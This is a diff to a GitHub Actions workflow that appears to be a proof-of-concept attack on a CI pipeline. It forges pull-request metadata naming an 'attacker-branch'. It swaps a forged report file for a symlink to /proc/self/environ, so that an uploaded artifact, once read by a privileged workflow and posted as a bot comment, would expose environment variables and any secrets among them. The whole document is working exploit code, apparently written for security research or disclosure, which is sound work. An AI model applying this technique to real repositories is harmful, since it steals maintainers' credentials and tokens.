@@ -15,7 +15,8 @@ jobs:
           printf '1\npr_number=424242\n' > pr-data/pr_number.txt
           printf 'main\n' > pr-data/base_ref.txt
           printf 'attacker-branch\n' > pr-data/head_ref.txt
-          printf '<!-- binary-size-report -->\n### POC: attacker-controlled body posted as patina-automation[bot]\n' > pr-data/binary_size_report.md
+          ln -s /proc/self/environ pr-data/binary_size_report.md
+          ls -l pr-data/
 
       - name: Upload PR Data and Report
         uses: actions/upload-artifact@v7
